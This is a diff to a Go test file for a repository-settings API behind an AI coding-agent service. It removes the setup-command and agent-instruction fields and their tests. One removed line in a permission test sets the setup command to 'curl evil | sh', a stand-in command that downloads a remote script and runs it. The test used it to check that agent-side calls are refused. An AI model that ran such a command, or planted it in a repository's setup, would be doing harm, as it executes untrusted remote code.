@@ -27,8 +27,6 @@ func validRepo(name string) *factoryv1.Repo {
 		Name:              name,
 		DefaultBranch:     "trunk",
 		AutoPickup:        true,
-		SetupCommands:     "npm ci",
-		AgentInstructions: "Be careful.",
 		TimeLimitMinutes:  15,
 		SentryProject:     "check-in",
 		RedPrLabel:        "deps",
@@ -74,7 +72,6 @@ func TestListReposIncludesTheSeededRepo(t *testing.T) {
 	}
 	require.NotNil(t, seeded)
 	assert.Equal(t, "main", seeded.DefaultBranch)
-	assert.Equal(t, "Follow AGENTS.md.", seeded.AgentInstructions)
 	assert.EqualValues(t, 60, seeded.TimeLimitMinutes)
 }
 
@@ -89,8 +86,6 @@ func TestCreateRepoStoresEverySetting(t *testing.T) {
 	assert.Equal(t, "alpha", got.Name)
 	assert.Equal(t, "trunk", got.DefaultBranch)
 	assert.True(t, got.AutoPickup)
-	assert.Equal(t, "npm ci", got.SetupCommands)
-	assert.Equal(t, "Be careful.", got.AgentInstructions)
 	assert.EqualValues(t, 15, got.TimeLimitMinutes)
 	assert.Equal(t, "check-in", got.SentryProject)
 	assert.Equal(t, "deps", got.RedPrLabel)
@@ -141,12 +136,6 @@ func TestCreateRepoValidation(t *testing.T) {
 		"branch slash": with(func(r *factoryv1.Repo) {
 			r.DefaultBranch = "/a"
 		}),
-		"long setup": with(func(r *factoryv1.Repo) {
-			r.SetupCommands = strings.Repeat("a", 10001)
-		}),
-		"long instructions": with(func(r *factoryv1.Repo) {
-			r.AgentInstructions = strings.Repeat("a", 20001)
-		}),
 		"negative limit": with(func(r *factoryv1.Repo) { r.TimeLimitMinutes = -1 }),
 		"huge limit":     with(func(r *factoryv1.Repo) { r.TimeLimitMinutes = 1441 }),
 	} {
@@ -177,8 +166,6 @@ func TestUpdateRepoReplacesEverySetting(t *testing.T) {
 
 	repo.DefaultBranch = "develop"
 	repo.AutoPickup = false
-	repo.SetupCommands = "make deps"
-	repo.AgentInstructions = "Follow AGENTS.md."
 	repo.TimeLimitMinutes = 90
 	resp, err := c.UpdateRepo(
 		context.Background(), &factoryv1.UpdateRepoRequest{Repo: repo},
@@ -188,8 +175,6 @@ func TestUpdateRepoReplacesEverySetting(t *testing.T) {
 	got := resp.Repo
 	assert.Equal(t, repo.Id, got.Id)
 	assert.Equal(t, "develop", got.DefaultBranch)
-	assert.Equal(t, "make deps", got.SetupCommands)
-	assert.Equal(t, "Follow AGENTS.md.", got.AgentInstructions)
 	assert.EqualValues(t, 90, got.TimeLimitMinutes)
 }
 
@@ -253,7 +238,7 @@ func TestRepoSettingsNeedABrowserSession(t *testing.T) {
 	_, err := mcp.CreateRepo(ctx, &factoryv1.CreateRepoRequest{Repo: validRepo("sneaky")})
 	assert.Equal(t, connect.CodePermissionDenied, code(err))
 
-	repo.SetupCommands = "curl evil | sh"
+	repo.AutoPickup = false
 	_, err = mcp.UpdateRepo(ctx, &factoryv1.UpdateRepoRequest{Repo: repo})
 	assert.Equal(t, connect.CodePermissionDenied, code(err))
 
